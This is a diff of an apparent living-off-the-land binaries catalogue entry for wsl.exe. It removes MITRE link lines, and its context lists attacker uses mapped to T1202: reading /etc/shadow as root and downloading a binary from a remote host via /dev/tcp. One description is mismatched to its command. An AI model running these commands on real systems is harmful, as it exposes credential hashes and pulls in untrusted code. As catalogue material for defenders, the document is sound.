@@ -10,7 +10,6 @@ Commands:
     Category: Execute
     Privileges: User
     MitreID: T1202
-    MitreLink: https://attack.mitre.org/techniques/T1202
     OperatingSystem: Windows 10, Windows 19 Server
   - Command: wsl.exe -u root -e cat /etc/shadow
     Description: Cats /etc/shadow file as root
@@ -18,7 +17,6 @@ Commands:
     Category: Execute
     Privileges: User
     MitreID: T1202
-    MitreLink: https://attack.mitre.org/techniques/T1202
     OperatingSystem: Windows 10, Windows 19 Server
   - Command: wsl.exe --exec bash -c 'cat file'
     Description: Cats /etc/shadow file as root
@@ -26,7 +24,6 @@ Commands:
     Category: Execute
     Privileges: User
     MitreID: T1202
-    MitreLink: https://attack.mitre.org/techniques/T1202
     OperatingSystem: Windows 10, Windows 19 Server
   - Command: wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
     Description: Downloads file from 192.168.1.10
@@ -34,7 +31,6 @@ Commands:
     Category: Download
     Privileges: User
     MitreID: T1202
-    MitreLink: https://attack.mitre.org/techniques/T1202
     OperatingSystem: Windows 10, Windows 19 Server
 Full_Path:
   - Path: C:\Windows\System32\wsl.exe
